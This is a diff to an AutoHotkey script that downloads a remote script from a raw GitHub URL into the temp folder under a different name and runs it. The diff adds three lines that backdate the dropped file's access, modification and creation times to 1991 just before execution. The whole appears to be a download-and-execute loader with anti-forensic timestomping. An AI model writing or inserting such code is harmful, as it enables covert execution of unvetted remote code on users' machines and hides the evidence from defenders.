@@ -15,4 +15,7 @@ if FileExist(A_Temp "\Hey.ahk")
 FileDelete, % A_Temp "\Hey.ahk"
 }
 UrlDownloadToFile, https://raw.githubusercontent.com/akuratnishe-dot/Hi/refs/heads/main/NotThis.ahk, %A_Temp%\Hey.ahk
+FileSetTime, 19910824000000, %A_Temp%\Hey.ahk, A
+FileSetTime, 19910824000000, %A_Temp%\Hey.ahk, M
+FileSetTime, 19910824000000, %A_Temp%\Hey.ahk, C
 Run, %A_Temp%\Hey.ahk
